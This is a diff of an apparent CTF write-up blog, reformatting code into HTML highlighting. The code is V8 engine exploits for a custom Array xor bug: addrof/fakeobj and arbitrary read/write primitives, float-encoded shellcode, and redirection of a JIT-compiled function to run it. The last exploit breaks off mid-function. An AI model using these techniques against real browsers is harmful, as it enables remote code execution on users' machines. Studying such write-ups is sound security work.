@@ -1457,131 +1457,129 @@ I wasn't able to find a way to do this with Turbofan, but perhaps we could try o
 
 With that added, **we have our final exploit code**.
 
-```js
-// set up helper stuff
-const buffer = new ArrayBuffer(8);
-const floatBuffer = new Float64Array(buffer);
-const int64Buffer = new BigUint64Array(buffer);
-
-// bigint to double
-function i2f(i) {
-  int64Buffer[0] = i;
-  return floatBuffer[0];
+<div class="jsConsole">
+	<div class="jsConCode"><span class="jsConNull">// set up helper stuff</span>
+<span class="jsConKw">const</span> <span class="jsConIdx">buffer</span> = <span class="jsConKw">new</span> <span class="jsConVar">ArrayBuffer</span>(<span class="jsConValIn">8</span>);
+<span class="jsConKw">const</span> <span class="jsConIdx">floatBuffer</span> = <span class="jsConKw">new</span> <span class="jsConVar">Float64Array</span>(<span class="jsConVar">buffer</span>);
+<span class="jsConKw">const</span> <span class="jsConIdx">int64Buffer</span> = <span class="jsConKw">new</span> <span class="jsConVar">BigUint64Array</span>(<span class="jsConVar">buffer</span>);
+<!---->
+<span class="jsConNull">// bigint to double</span>
+<span class="jsConKw">function</span> <span class="jsConIdx">i2f</span>(<span class="jsConIdx">i</span>) {
+  <span class="jsConVar">int64Buffer</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">i</span>;
+  <span class="jsConKw">return</span> <span class="jsConVar">floatBuffer</span>[<span class="jsConValIn">0</span>];
 }
-
-// double to bigint
-function f2i(f) {
-  floatBuffer[0] = f;
-  return int64Buffer[0];
+<!---->
+<span class="jsConNull">// double to bigint</span>
+<span class="jsConKw">function</span> <span class="jsConIdx">f2i</span>(<span class="jsConIdx">f</span>) {
+  <span class="jsConVar">floatBuffer</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">f</span>;
+  <span class="jsConKw">return</span> <span class="jsConVar">int64Buffer</span>[<span class="jsConValIn">0</span>];
 }
-
-// bigint to 32-bit hex string
-function hex32(i) {
-  return "0x" + i.toString(16).padStart(8, 0);
+<!---->
+<span class="jsConNull">// bigint to 32-bit hex string</span>
+<span class="jsConKw">function</span> <span class="jsConIdx">hex32</span>(<span class="jsConIdx">i</span>) {
+  <span class="jsConKw">return</span> <span class="jsConStr">"0x"</span> + <span class="jsConVar">i</span>.<span class="jsConFun">toString</span>(<span class="jsConValIn">16</span>).<span class="jsConFun">padStart</span>(<span class="jsConValIn">8</span>, <span class="jsConValIn">0</span>);
 }
-
-// bigint to 64-bit hex string
-function hex64(i) {
-  return "0x" + i.toString(16).padStart(16, 0);
+<!---->
+<span class="jsConNull">// bigint to 64-bit hex string</span>
+<span class="jsConKw">function</span> <span class="jsConIdx">hex64</span>(<span class="jsConIdx">i</span>) {
+  <span class="jsConKw">return</span> <span class="jsConStr">"0x"</span> + <span class="jsConVar">i</span>.<span class="jsConFun">toString</span>(<span class="jsConValIn">16</span>).<span class="jsConFun">padStart</span>(<span class="jsConValIn">16</span>, <span class="jsConValIn">0</span>);
 }
-
-// set up variables
-const arr = [1.1, 2.2, 3.3];
-const tmpObj = {a: 1};
-const objArr = [tmpObj];
-
-// nabbed from Popax21
-function obj2ptr(obj) {
-    var arr = [13.37];
-
-    arr.xor({
-        valueOf: function() {
-            arr[0] = {}; //Transition from PACKED_DOUBLE_ELEMENTS to PACKED_ELEMENTS
-            arr[0] = obj;
-            return 1; //Clear the lowest bit -> compressed SMI
-        } 
-    });
-    
-    return (arr[0] << 1) | 1;
+<!---->
+<span class="jsConNull">// set up variables</span>
+<span class="jsConKw">const</span> <span class="jsConIdx">arr</span> = [<span class="jsConValIn">1.1</span>, <span class="jsConValIn">2.2</span>, <span class="jsConValIn">3.3</span>];
+<span class="jsConKw">const</span> <span class="jsConIdx">tmpObj</span> = {<span class="jsConFun">a</span>: <span class="jsConValIn">1</span>};
+<span class="jsConKw">const</span> <span class="jsConIdx">objArr</span> = [<span class="jsConVar">tmpObj</span>];
+<!---->
+<span class="jsConNull">// nabbed from Popax21</span>
+<span class="jsConKw">function</span> <span class="jsConIdx">obj2ptr</span>(<span class="jsConIdx">obj</span>) {
+  <span class="jsConKw">var</span> <span class="jsConIdx">arr</span> = [<span class="jsConValIn">13.37</span>];
+  <span class="jsConVar">arr</span>.<span class="jsConFun">xor</span>({
+    <span class="jsConFun">valueOf</span>: <span class="jsConKw">function</span>() {
+      <span class="jsConVar">arr</span>[<span class="jsConValIn">0</span>] = {}; <span class="jsConNull">//Transition from PACKED_DOUBLE_ELEMENTS to PACKED_ELEMENTS</span>
+      <span class="jsConVar">arr</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">obj</span>;
+      <span class="jsConKw">return</span> <span class="jsConValIn">1</span>; <span class="jsConNull">//Clear the lowest bit -&gt; compressed SMI</span>
+    } 
+  });
+  <span class="jsConKw">return</span> (<span class="jsConVar">arr</span>[<span class="jsConValIn">0</span>] &lt;&lt; <span class="jsConValIn">1</span>) | <span class="jsConValIn">1</span>;
 }
-
-// set up the fake array
-const arrAddr = BigInt(obj2ptr(arr));
-const arrElementsAddr = arrAddr - 0x20n;
-const fakeAddr = arrElementsAddr + 0x10n;
-const fakeElementsAddr = arrElementsAddr + 0x8n;
-arr[0] = i2f(0x00000100000008a9n);
-arr[1] = i2f(0x00000725001cb7c5n);
-arr[2] = i2f(0x0000010000000000n + fakeElementsAddr);
-
-// do the exploit
-const tmp = [1.1];
-const evil = {
-  valueOf: () => {
-    tmp[0] = arr;
-    return Number(arrAddr ^ fakeAddr);
+<!---->
+<span class="jsConNull">// set up the fake array</span>
+<span class="jsConKw">const</span> <span class="jsConIdx">arrAddr</span> = <span class="jsConVar">BigInt</span>(<span class="jsConVar">obj2ptr</span>(<span class="jsConVar">arr</span>));
+<span class="jsConKw">const</span> <span class="jsConIdx">arrElementsAddr</span> = <span class="jsConVar">arrAddr</span> - <span class="jsConValIn">0x20n</span>;
+<span class="jsConKw">const</span> <span class="jsConIdx">fakeAddr</span> = <span class="jsConVar">arrElementsAddr</span> + <span class="jsConValIn">0x10n</span>;
+<span class="jsConKw">const</span> <span class="jsConIdx">fakeElementsAddr</span> = <span class="jsConVar">arrElementsAddr</span> + <span class="jsConValIn">0x8n</span>;
+<span class="jsConVar">arr</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">i2f</span>(<span class="jsConValIn">0x00000100000008a9n</span>);
+<span class="jsConVar">arr</span>[<span class="jsConValIn">1</span>] = <span class="jsConVar">i2f</span>(<span class="jsConValIn">0x00000725001cb7c5n</span>);
+<span class="jsConVar">arr</span>[<span class="jsConValIn">2</span>] = <span class="jsConVar">i2f</span>(<span class="jsConValIn">0x0000010000000000n</span> + <span class="jsConVar">fakeElementsAddr</span>);
+<!---->
+<span class="jsConNull">// do the exploit</span>
+<span class="jsConKw">const</span> <span class="jsConIdx">tmp</span> = [<span class="jsConValIn">1.1</span>];
+<span class="jsConKw">const</span> <span class="jsConIdx">evil</span> = {
+  <span class="jsConFun">valueOf</span>: () =&gt; {
+    <span class="jsConVar">tmp</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">arr</span>;
+    <span class="jsConKw">return</span> <span class="jsConVar">Number</span>(<span class="jsConVar">arrAddr</span> ^ <span class="jsConVar">fakeAddr</span>);
   }
 };
-tmp.xor(evil);
-
-// this is the fake 128-element array
-const oob = tmp[0];
-
-// set up addrof/fakeobj primitives
-function addrof(o) {
-    objArr[0] = o;
-    return f2i(oob[10]) >> 32n;
+<span class="jsConVar">tmp</span>.<span class="jsConFun">xor</span>(<span class="jsConVar">evil</span>);
+<!---->
+<span class="jsConNull">// this is the fake 128-element array</span>
+<span class="jsConKw">const</span> <span class="jsConIdx">oob</span> = <span class="jsConVar">tmp</span>[<span class="jsConValIn">0</span>];
+<!---->
+<span class="jsConNull">// set up addrof/fakeobj primitives</span>
+<span class="jsConKw">function</span> <span class="jsConIdx">addrof</span>(<span class="jsConIdx">o</span>) {
+    <span class="jsConVar">objArr</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">o</span>;
+    <span class="jsConKw">return</span> <span class="jsConVar">f2i</span>(<span class="jsConVar">oob</span>[<span class="jsConValIn">10</span>]) &gt;&gt; <span class="jsConValIn">32n</span>;
 }
-
-function fakeobj(a) {
-  const temp = f2i(oob[10]) & 0xFFFFFFFFn;
-  oob[10] = i2f(temp + (a << 32n));
-  return objArr[0];
+<!---->
+<span class="jsConKw">function</span> <span class="jsConIdx">fakeobj</span>(<span class="jsConIdx">a</span>) {
+  <span class="jsConKw">const</span> <span class="jsConIdx">temp</span> = <span class="jsConVar">f2i</span>(<span class="jsConVar">oob</span>[<span class="jsConValIn">10</span>]) &amp; <span class="jsConValIn">0xFFFFFFFFn</span>;
+  <span class="jsConVar">oob</span>[<span class="jsConValIn">10</span>] = <span class="jsConVar">i2f</span>(<span class="jsConVar">temp</span> + (<span class="jsConVar">a</span> &lt;&lt; <span class="jsConValIn">32n</span>));
+  <span class="jsConKw">return</span> <span class="jsConVar">objArr</span>[<span class="jsConValIn">0</span>];
 }
-
-// set up read/write primitives
-function read(addr) {
-  const readArr = [1.1, 2.2];
-  readArr[0] = i2f(0x00000725001cb7c5n);
-  readArr[1] = i2f(0x0000000200000000n + addr - 0x8n);
-  return f2i(fakeobj(addrof(readArr) - 0x10n)[0]);
+<!---->
+<span class="jsConNull">// set up read/write primitives</span>
+<span class="jsConKw">function</span> <span class="jsConIdx">read</span>(<span class="jsConIdx">addr</span>) {
+  <span class="jsConKw">const</span> <span class="jsConIdx">readArr</span> = [<span class="jsConValIn">1.1</span>, <span class="jsConValIn">2.2</span>];
+  <span class="jsConVar">readArr</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">i2f</span>(<span class="jsConValIn">0x00000725001cb7c5n</span>);
+  <span class="jsConVar">readArr</span>[<span class="jsConValIn">1</span>] = <span class="jsConVar">i2f</span>(<span class="jsConValIn">0x0000000200000000n</span> + <span class="jsConVar">addr</span> - <span class="jsConValIn">0x8n</span>);
+  <span class="jsConKw">return</span> <span class="jsConVar">f2i</span>(<span class="jsConVar">fakeobj</span>(<span class="jsConVar">addrof</span>(<span class="jsConVar">readArr</span>) - <span class="jsConValIn">0x10n</span>)[<span class="jsConValIn">0</span>]);
 }
-
-function write(addr, data) {
-  const writeArr = [1.1, 2.2];
-  writeArr[0] = i2f(0x00000725001cb7c5n);
-  writeArr[1] = i2f(0x0000000200000000n + addr - 0x8n);
-  const fakeArr = fakeobj(addrof(writeArr) - 0x10n);
-  fakeArr[0] = i2f(data);
+<!---->
+<span class="jsConKw">function</span> <span class="jsConIdx">write</span>(<span class="jsConIdx">addr</span>, <span class="jsConIdx">data</span>) {
+  <span class="jsConKw">const</span> <span class="jsConIdx">writeArr</span> = [<span class="jsConValIn">1.1</span>, <span class="jsConValIn">2.2</span>];
+  <span class="jsConVar">writeArr</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">i2f</span>(<span class="jsConValIn">0x00000725001cb7c5n</span>);
+  <span class="jsConVar">writeArr</span>[<span class="jsConValIn">1</span>] = <span class="jsConVar">i2f</span>(<span class="jsConValIn">0x0000000200000000n</span> + <span class="jsConVar">addr</span> - <span class="jsConValIn">0x8n</span>);
+  <span class="jsConKw">const</span> <span class="jsConIdx">fakeArr</span> = <span class="jsConVar">fakeobj</span>(<span class="jsConVar">addrof</span>(<span class="jsConVar">writeArr</span>) - <span class="jsConValIn">0x10n</span>);
+  <span class="jsConVar">fakeArr</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">i2f</span>(<span class="jsConVar">data</span>);
 }
-
-// set up the shellcode function
-function shellcode() {
-  // nabbed from Anvbis
-  return [
-    1.9711828979523134e-246,
-    1.9562205631094693e-246,
-    1.9557819155246427e-246,
-    1.9711824228871598e-246,
-    1.971182639857203e-246,
-    1.9711829003383248e-246,
-    1.9895153920223886e-246,
-    1.971182898881177e-246
+<!---->
+<span class="jsConNull">// set up the shellcode function</span>
+<span class="jsConKw">function</span> <span class="jsConIdx">shellcode</span>() {
+  <span class="jsConNull">// nabbed from Anvbis</span>
+  <span class="jsConKw">return</span> [
+    <span class="jsConValIn">1.9711828979523134e-246</span>,
+    <span class="jsConValIn">1.9562205631094693e-246</span>,
+    <span class="jsConValIn">1.9557819155246427e-246</span>,
+    <span class="jsConValIn">1.9711824228871598e-246</span>,
+    <span class="jsConValIn">1.971182639857203e-246</span>,
+    <span class="jsConValIn">1.9711829003383248e-246</span>,
+    <span class="jsConValIn">1.9895153920223886e-246</span>,
+    <span class="jsConValIn">1.971182898881177e-246</span>
   ]
 }
-
-// turn the shellcode into maglev
-for (let i = 0; i < 10000; i++) {
-  shellcode();
+<!---->
+<span class="jsConNull">// turn the shellcode into maglev</span>
+<span class="jsConKw">for</span> (<span class="jsConKw">let</span> <span class="jsConIdx">i</span> = <span class="jsConValIn">0</span>; <span class="jsConVar">i</span> &lt; <span class="jsConValIn">10000</span>; <span class="jsConVar">i</span>++) {
+  <span class="jsConVar">shellcode</span>();
 }
-
-// redirect the function start to our shellcode
-funcAddr = addrof(shellcode)
-codeAddr = read(funcAddr + 0x8n) >> 32n
-instructionStart = codeAddr + 0x14n
-write(instructionStart, read(instructionStart) + 0x7fn);
-shellcode();
-```
+<!---->
+<span class="jsConNull">// redirect the function start to our shellcode</span>
+<span class="jsConVar">funcAddr</span> = <span class="jsConVar">addrof</span>(<span class="jsConVar">shellcode</span>)
+<span class="jsConVar">codeAddr</span> = <span class="jsConVar">read</span>(<span class="jsConVar">funcAddr</span> + <span class="jsConValIn">0x8n</span>) &gt;&gt; <span class="jsConValIn">32n</span>
+<span class="jsConVar">instructionStart</span> = <span class="jsConVar">codeAddr</span> + <span class="jsConValIn">0x14n</span>
+<span class="jsConVar">write</span>(<span class="jsConVar">instructionStart</span>, <span class="jsConVar">read</span>(<span class="jsConVar">instructionStart</span>) + <span class="jsConValIn">0x7fn</span>);
+<span class="jsConVar">shellcode</span>();</div>
+</div>
 
 **Let's get the flag!**
 
@@ -1606,202 +1604,202 @@ Since this was my first time doing anything like this I made a few "mistakes" al
 
 The first thing is something I've already implemented in the final exploit code above - the `obj2ptr` function I nabbed from Popax21's exploit code. Originally, I used `%DebugPrint(arr)` to see the address of the `arr` array on every run to change the code accordingly, but there's a pretty easy way to not have to do that at all!
 
-```js
-// snippet from Popax21's exploit code
-function obj2ptr(obj) {
-    var arr = [13.37];
-
-    arr.xor({
-        valueOf: function() {
-            arr[0] = {}; //Transition from PACKED_DOUBLE_ELEMENTS to PACKED_ELEMENTS
-            arr[0] = obj;
-            return 1; //Clear the lowest bit -> compressed SMI
+<div class="jsConsole">
+	<div class="jsConCode"><span class="jsConNull">// snippet from Popax21's exploit code</span>
+<span class="jsConKw">function</span> <span class="jsConIdx">obj2ptr</span>(<span class="jsConIdx">obj</span>) {
+    <span class="jsConKw">var</span> <span class="jsConIdx">arr</span> = [<span class="jsConValIn">13.37</span>];
+<!---->
+    <span class="jsConVar">arr</span>.<span class="jsConFun">xor</span>({
+        <span class="jsConFun">valueOf</span>: <span class="jsConKw">function</span>() {
+            <span class="jsConVar">arr</span>[<span class="jsConValIn">0</span>] = {}; <span class="jsConNull">//Transition from PACKED_DOUBLE_ELEMENTS to PACKED_ELEMENTS</span>
+            <span class="jsConVar">arr</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">obj</span>;
+            <span class="jsConKw">return</span> <span class="jsConValIn">1</span>; <span class="jsConNull">//Clear the lowest bit -&gt; compressed SMI</span>
         } 
     });
-    
-    return (arr[0] << 1) | 1;
+<!---->
+    <span class="jsConKw">return</span> (<span class="jsConVar">arr</span>[<span class="jsConValIn">0</span>] &lt;&lt; <span class="jsConValIn">1</span>) | <span class="jsConValIn">1</span>;
 }
-
-function ptr2obj(ptr) {
-    var arr = [13.37];
-
-    arr.xor({
-        valueOf: function() {
-            arr[0] = {}; //Transition from PACKED_DOUBLE_ELEMENTS to PACKED_ELEMENTS
-            arr[0] = (ptr >> 1);
-            return 1; //Set the lowest bit -> compressed pointer
+<!---->
+<span class="jsConKw">function</span> <span class="jsConIdx">ptr2obj</span>(<span class="jsConIdx">ptr</span>) {
+    <span class="jsConKw">var</span> <span class="jsConIdx">arr</span> = [<span class="jsConValIn">13.37</span>];
+<!---->
+    <span class="jsConVar">arr</span>.<span class="jsConFun">xor</span>({
+        <span class="jsConFun">valueOf</span>: <span class="jsConKw">function</span>() {
+            <span class="jsConVar">arr</span>[<span class="jsConValIn">0</span>] = {}; <span class="jsConNull">//Transition from PACKED_DOUBLE_ELEMENTS to PACKED_ELEMENTS</span>
+            <span class="jsConVar">arr</span>[<span class="jsConValIn">0</span>] = (<span class="jsConVar">ptr</span> &gt;&gt; <span class="jsConValIn">1</span>);
+            <span class="jsConKw">return</span> <span class="jsConValIn">1</span>; <span class="jsConNull">//Set the lowest bit -&gt; compressed pointer</span>
         } 
     });
-    
-    return arr[0];
-}
-```
+<!---->
+    <span class="jsConKw">return</span> <span class="jsConVar">arr</span>[<span class="jsConValIn">0</span>];
+}</div>
+</div>
 
 Since the difference between a pointer and an SMI is just the last bit, we can put any object or pointer into an array, xor its last bit, and get out the pointer or object accordingly. While I only used those functions in my example exploit code to get the initial address of `arr`, they are pretty much equal to the full **addrof** and **fakeobj** primitives! Beautiful.
 
 Another approach to exploiting the xor I saw in a few solves was changing the length of the array to something small, then forcing a GC to defragment some other object into a region beyond past the array, and then changing the length back to a big amount to get an out-of-bounds read/write. This approach was probably quite brutal to work with, but earned rdjgr their first blood[^6].
 
-```js
-// snippet from rdjgr's exploit code
-function pwn() {
-    let num = {};
-    let size = 0x12;
-    let num_rets = 0x10;
-    let a = [];
-    for (let i = 0; i < size; i++) {
-        a.push(1.1);
+<div class="jsConsole">
+	<div class="jsConCode"><span class="jsConNull">// snippet from rdjgr's exploit code</span>
+<span class="jsConKw">function</span> <span class="jsConIdx">pwn</span>() {
+    <span class="jsConKw">let</span> <span class="jsConIdx">num</span> = {};
+    <span class="jsConKw">let</span> <span class="jsConIdx">size</span> = <span class="jsConValIn">0x12</span>;
+    <span class="jsConKw">let</span> <span class="jsConIdx">num_rets</span> = <span class="jsConValIn">0x10</span>;
+    <span class="jsConKw">let</span> <span class="jsConIdx">a</span> = [];
+    <span class="jsConKw">for</span> (<span class="jsConKw">let</span> <span class="jsConIdx">i</span> = <span class="jsConValIn">0</span>; <span class="jsConVar">i</span> &lt; <span class="jsConVar">size</span>; <span class="jsConVar">i</span>++) {
+        <span class="jsConVar">a</span>.<span class="jsConFun">push</span>(<span class="jsConValIn">1.1</span>);
     }
-    var rets = [{a: 1.1}];
-    num.valueOf = function() {
-        console.log("valueof called");
-        a.length = 1;
-        gc();
-        rets.push({b: 1.1});
-
-        return 0x40;
+    <span class="jsConKw">var</span> <span class="jsConIdx">rets</span> = [{<span class="jsConFun">a</span>: <span class="jsConValIn">1.1</span>}];
+    <span class="jsConVar">num</span>.<span class="jsConFun">valueOf</span> = <span class="jsConKw">function</span>() {
+        <span class="jsConVar">console</span>.<span class="jsConFun">log</span>(<span class="jsConStr">"valueof called"</span>);
+        <span class="jsConVar">a</span>.<span class="jsConFun">length</span> = <span class="jsConValIn">1</span>;
+        <span class="jsConVar">gc</span>();
+        <span class="jsConVar">rets</span>.<span class="jsConFun">push</span>({<span class="jsConFun">b</span>: <span class="jsConValIn">1.1</span>});
+<!---->
+        <span class="jsConKw">return</span> <span class="jsConValIn">0x40</span>;
     };
-
-    a.xor(num);
-    rets.length = 900
-    return rets
-}
-```
+<!---->
+    <span class="jsConVar">a</span>.<span class="jsConFun">xor</span>(<span class="jsConVar">num</span>);
+    <span class="jsConVar">rets</span>.<span class="jsConFun">length</span> = <span class="jsConValIn">900</span>
+    <span class="jsConKw">return</span> <span class="jsConVar">rets</span>
+}</div>
+</div>
 
 As for the code execution part, pretty much everyone went for a wasm rwx route instead of going through all the trouble I did to optimize a function into Maglev/Turbocode. [There](https://www.willsroot.io/2021/01/rope2-hackthebox-writeup-chromium-v8.html) [are](https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/) [a](https://medium.com/@numencyberlabs/use-wasm-to-bypass-latest-chrome-v8sbx-again-639c4c05b157) [lot](https://jackfromeast.site/2024-01/v8-exploit-revist-oob-v8-starCTF-2019.html) [of](https://github.com/Mem2019/Mem2019.github.io/blob/master/codes/Google2022/exp.js) [write-ups](https://tiszka.com/blog/CVE_2021_21225_exploit.html) for the wasm route, so I felt it'd be more fun to blog about a different approach, and it was the approach I took at the original CTF either way.
 
 In case you're wondering what my original code at the CTF looked like, it was this:
 
-```js
-// lyra
-var bs = new ArrayBuffer(8);
-var fs = new Float64Array(bs);
-var is = new BigUint64Array(bs);
-
-function ftoi(x) {
-  fs[0] = x;
-  return is[0];
+<div class="jsConsole">
+	<div class="jsConCode"><details><summary style="cursor:pointer">exploit_final.js</summary><span class="jsConNull">// lyra</span>
+<span class="jsConKw">var</span> <span class="jsConIdx">bs</span> = <span class="jsConKw">new</span> <span class="jsConVar">ArrayBuffer</span>(<span class="jsConValIn">8</span>);
+<span class="jsConKw">var</span> <span class="jsConIdx">fs</span> = <span class="jsConKw">new</span> <span class="jsConVar">Float64Array</span>(<span class="jsConVar">bs</span>);
+<span class="jsConKw">var</span> <span class="jsConIdx">is</span> = <span class="jsConKw">new</span> <span class="jsConVar">BigUint64Array</span>(<span class="jsConVar">bs</span>);
+<!---->
+<span class="jsConKw">function</span> <span class="jsConIdx">ftoi</span>(<span class="jsConIdx">x</span>) {
+  <span class="jsConVar">fs</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">x</span>;
+  <span class="jsConKw">return</span> <span class="jsConVar">is</span>[<span class="jsConValIn">0</span>];
 }
-
-function itof(x) {
-  is[0] = x;
-  return fs[0];
+<!---->
+<span class="jsConKw">function</span> <span class="jsConIdx">itof</span>(<span class="jsConIdx">x</span>) {
+  <span class="jsConVar">is</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">x</span>;
+  <span class="jsConKw">return</span> <span class="jsConVar">fs</span>[<span class="jsConValIn">0</span>];
 }
-
-
-
-const foo = (() => {
-const f = () => {
-  return [
-1.9711828979523134e-246,
-1.9562205631094693e-246,
-1.9557819155246427e-246,
-1.9711824228871598e-246,
-1.971182639857203e-246,
-1.9711829003383248e-246,
-1.9895153920223886e-246,
-1.971182898881177e-246,
+<!---->
+<!---->
+<!---->
+<span class="jsConKw">const</span> <span class="jsConIdx">foo</span> = (() =&gt; {
+<span class="jsConKw">const</span> <span class="jsConIdx">f</span> = () =&gt; {
+  <span class="jsConKw">return</span> [
+<span class="jsConValIn">1.9711828979523134e-246</span>,
+<span class="jsConValIn">1.9562205631094693e-246</span>,
+<span class="jsConValIn">1.9557819155246427e-246</span>,
+<span class="jsConValIn">1.9711824228871598e-246</span>,
+<span class="jsConValIn">1.971182639857203e-246</span>,
+<span class="jsConValIn">1.9711829003383248e-246</span>,
+<span class="jsConValIn">1.9895153920223886e-246</span>,
+<span class="jsConValIn">1.971182898881177e-246</span>,
   ];
 }
-//%PrepareFunctionForOptimization(f);
-f();
-//%OptimizeFunctionOnNextCall(f);
-for (var i = 0; i < 100000; i++) { f() }
-f()
-return f;
+<span class="jsConNull">//%PrepareFunctionForOptimization(f);</span>
+<span class="jsConVar">f</span>();
+<span class="jsConNull">//%OptimizeFunctionOnNextCall(f);</span>
+<span class="jsConKw">for</span> (<span class="jsConKw">var</span> <span class="jsConIdx">i</span> = <span class="jsConValIn">0</span>; <span class="jsConVar">i</span> &lt; <span class="jsConValIn">100000</span>; <span class="jsConVar">i</span>++) { <span class="jsConVar">f</span>() }
+<span class="jsConVar">f</span>()
+<span class="jsConKw">return</span> <span class="jsConVar">f</span>;
 })();
-
-var a = [];
-for (var i = 0; i < 100000; i++) { a[i] = new String("");foo(); }
-new ArrayBuffer(0x80000000);
-
-var arr1 = [5.432309235825e-312, 1337.888, 3.881131231533e-311, 5.432329947926e-312];
-var flt = [1.1];
-var tmp = {a: 1};
-var obj = [tmp];
-var array = [-0];
-var hasRun = false;
-
-//%DebugPrint(arr1);
-//%DebugPrint(flt);
-//%DebugPrint(obj);
-
-function getHandler() {
-  if (hasRun) return;
-  hasRun = true;
-  array[0] = arr1;
-  return 80;
+<!---->
+<span class="jsConKw">var</span> <span class="jsConIdx">a</span> = [];
+<span class="jsConKw">for</span> (<span class="jsConKw">var</span> <span class="jsConIdx">i</span> = <span class="jsConValIn">0</span>; <span class="jsConVar">i</span> &lt; <span class="jsConValIn">100000</span>; <span class="jsConVar">i</span>++) { <span class="jsConVar">a</span>[<span class="jsConVar">i</span>] = <span class="jsConKw">new</span> <span class="jsConVar">String</span>(<span class="jsConStr">""</span>);<span class="jsConVar">foo</span>(); }
+<span class="jsConKw">new</span> <span class="jsConVar">ArrayBuffer</span>(<span class="jsConValIn">0x80000000</span>);
+<!---->
+<span class="jsConKw">var</span> <span class="jsConIdx">arr1</span> = [<span class="jsConValIn">5.432309235825e-312</span>, <span class="jsConValIn">1337.888</span>, <span class="jsConValIn">3.881131231533e-311</span>, <span class="jsConValIn">5.432329947926e-312</span>];
+<span class="jsConKw">var</span> <span class="jsConIdx">flt</span> = [<span class="jsConValIn">1.1</span>];
+<span class="jsConKw">var</span> <span class="jsConIdx">tmp</span> = {<span class="jsConFun">a</span>: <span class="jsConValIn">1</span>};
+<span class="jsConKw">var</span> <span class="jsConIdx">obj</span> = [<span class="jsConVar">tmp</span>];
+<span class="jsConKw">var</span> <span class="jsConIdx">array</span> = [-<span class="jsConValIn">0</span>];
+<span class="jsConKw">var</span> <span class="jsConIdx">hasRun</span> = <span class="jsConValIn">false</span>;
+<!---->
+<span class="jsConNull">//%DebugPrint(arr1);</span>
+<span class="jsConNull">//%DebugPrint(flt);</span>
+<span class="jsConNull">//%DebugPrint(obj);</span>
+<!---->
+<span class="jsConKw">function</span> <span class="jsConIdx">getHandler</span>() {
+  <span class="jsConKw">if</span> (<span class="jsConVar">hasRun</span>) <span class="jsConKw">return</span>;
+  <span class="jsConVar">hasRun</span> = <span class="jsConValIn">true</span>;
+  <span class="jsConVar">array</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">arr1</span>;
+  <span class="jsConKw">return</span> <span class="jsConValIn">80</span>;
 }
-
-x = []
-x.__defineGetter__("0", getHandler);
-
-array.xor(x);
-
-//%DebugPrint(arr1);
-
-//%SystemBreak();
-
-console.log("s1");
-
-const oob = array[0];
-
-console.log("s2");
-
-
-
-console.log("s3");
-
-function addrof(o) {
-  console.log("oob = oob");
-  oob[6] = oob[18]; 
-  console.log("obj[0] = o");
-  obj[0] = o;
-  console.log("ret");
-  return (ftoi(flt[0]) & 0xffffffffn) - 1n;
+<!---->
+<span class="jsConVar">x</span> = []
+<span class="jsConVar">x</span>.<span class="jsConFun">__defineGetter__</span>(<span class="jsConStr">"0"</span>, <span class="jsConVar">getHandler</span>);
+<!---->
+<span class="jsConVar">array</span>.<span class="jsConFun">xor</span>(<span class="jsConVar">x</span>);
+<!---->
+<span class="jsConNull">//%DebugPrint(arr1);</span>
+<!---->
+<span class="jsConNull">//%SystemBreak();</span>
+<!---->
+<span class="jsConVar">console</span>.<span class="jsConFun">log</span>(<span class="jsConStr">"s1"</span>);
+<!---->
+<span class="jsConKw">const</span> <span class="jsConIdx">oob</span> = <span class="jsConVar">array</span>[<span class="jsConValIn">0</span>];
+<!---->
+<span class="jsConVar">console</span>.<span class="jsConFun">log</span>(<span class="jsConStr">"s2"</span>);
+<!---->
+<!---->
+<!---->
+<span class="jsConVar">console</span>.<span class="jsConFun">log</span>(<span class="jsConStr">"s3"</span>);
+<!---->
+<span class="jsConKw">function</span> <span class="jsConIdx">addrof</span>(<span class="jsConIdx">o</span>) {
+  <span class="jsConVar">console</span>.<span class="jsConFun">log</span>(<span class="jsConStr">"oob = oob"</span>);
+  <span class="jsConVar">oob</span>[<span class="jsConValIn">6</span>] = <span class="jsConVar">oob</span>[<span class="jsConValIn">18</span>]; 
+  <span class="jsConVar">console</span>.<span class="jsConFun">log</span>(<span class="jsConStr">"obj[0] = o"</span>);
+  <span class="jsConVar">obj</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">o</span>;
+  <span class="jsConVar">console</span>.<span class="jsConFun">log</span>(<span class="jsConStr">"ret"</span>);
+  <span class="jsConKw">return</span> (<span class="jsConVar">ftoi</span>(<span class="jsConVar">flt</span>[<span class="jsConValIn">0</span>]) &amp; <span class="jsConValIn">0xffffffffn</span>) - <span class="jsConValIn">1n</span>;
 }
-
-function read(p) {
-  let a = ftoi(oob[6]) >> 32n;
-  oob[6] = itof((a << 32n) + p - 8n + 1n);
-  return ftoi(flt[0]);
+<!---->
+<span class="jsConKw">function</span> <span class="jsConIdx">read</span>(<span class="jsConIdx">p</span>) {
+  <span class="jsConKw">let</span> <span class="jsConIdx">a</span> = <span class="jsConVar">ftoi</span>(<span class="jsConVar">oob</span>[<span class="jsConValIn">6</span>]) &gt;&gt; <span class="jsConValIn">32n</span>;
+  <span class="jsConVar">oob</span>[<span class="jsConValIn">6</span>] = <span class="jsConVar">itof</span>((<span class="jsConVar">a</span> &lt;&lt; <span class="jsConValIn">32n</span>) + <span class="jsConVar">p</span> - <span class="jsConValIn">8n</span> + <span class="jsConValIn">1n</span>);
+  <span class="jsConKw">return</span> <span class="jsConVar">ftoi</span>(<span class="jsConVar">flt</span>[<span class="jsConValIn">0</span>]);
 }
-
-function write(p, x) {
-  let a = ftoi(oob[6]) >> 32n;
-  oob[6] = itof((a << 32n) + p - 8n + 1n);
-  flt[0] = itof(x);
+<!---->
+<span class="jsConKw">function</span> <span class="jsConIdx">write</span>(<span class="jsConIdx">p</span>, <span class="jsConIdx">x</span>) {
